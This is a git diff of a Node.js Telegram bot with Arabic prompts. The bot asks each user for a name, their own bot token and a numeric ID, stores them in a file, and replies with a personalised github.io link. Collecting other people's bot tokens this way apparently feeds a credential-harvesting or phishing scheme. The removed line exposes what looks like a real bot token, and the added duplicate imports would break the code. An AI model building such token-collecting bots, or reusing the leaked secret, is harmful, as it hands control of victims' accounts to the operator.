@@ -1,8 +1,10 @@
 import { Telegraf } from 'telegraf';
 import fs from 'fs';
 import http from 'http';
+import { Telegraf } from 'telegraf';
+import fs from 'fs';
 
-const mainBot = new Telegraf('8180329300:AAFg-ruLWrlFkoPAy8Lu-gXIGHNkDNfK0O4');
+const mainBot = new Telegraf('ضع التوكن هنا');
 
 function loadUsers() {
   try {
@@ -19,32 +21,46 @@ function saveUsers(users) {
 const users = loadUsers();
 
 mainBot.start((ctx) => {
-  ctx.reply('👋 أهلاً بك! ما هو اسمك؟ 🤔');
+  const chatId = ctx.chat.id.toString();
+  users[chatId] = { step: 'name' }; // ابدأ بخطوة الاسم
+  ctx.reply('👋 أهلاً بك! ما هو اسمك؟');
 });
 
 mainBot.on('text', (ctx) => {
   const chatId = ctx.chat.id.toString();
   const text = ctx.message.text;
-  
-  if (!users[chatId]) {
-    if (/^\d{9,}$/.test(text) || text.includes(':')) {
-      if (!users[chatId]) users[chatId] = {};
-      if (!users[chatId].token && text.includes(':')) {
-        users[chatId].token = text;
-        ctx.reply('🔒 أرسل الآن الـ ID الخاص بك:');
-      } else if (!users[chatId].id && /^\d{9,}$/.test(text)) {
-        users[chatId].id = text;
-        ctx.reply(`✅ تم الحفظ!
+
+  if (!users[chatId]) users[chatId] = { step: 'name' };
+
+  const user = users[chatId];
+
+  if (user.step === 'name') {
+    user.name = text;
+    user.step = 'token';
+    ctx.reply('🔑 أرسل التوكن الخاص بك:');
+  } else if (user.step === 'token') {
+    if (text.includes(':')) {
+      user.token = text;
+      user.step = 'id';
+      ctx.reply('🆔 الآن أرسل الـ ID الخاص بك:');
+    } else {
+      ctx.reply('❌ صيغة التوكن غير صحيحة. أعد الإرسال ويكون فيه ":"');
+    }
+  } else if (user.step === 'id') {
+    if (/^\d{9,}$/.test(text)) {
+      user.id = text;
+      user.step = 'done';
+      saveUsers(users);
+      ctx.reply(`✅ تم الحفظ بنجاح!
 رابطك الخاص:
 https://qwertyuiopqw12.github.io/Boot-/?ref=${text}`);
-        saveUsers(users);
-      }
+    } else {
+      ctx.reply('❌ ID غير صحيح. أعد الإرسال (يجب أن يكون أرقام فقط)');
     }
   }
 });
 
 mainBot.launch();
 console.log('🤖 تم تشغيل البوت!');
-
 // تحايل لفتح منفذ وهمي لتجنب خطأ Render
 http.createServer(() => {}).listen(process.env.PORT || 3000);
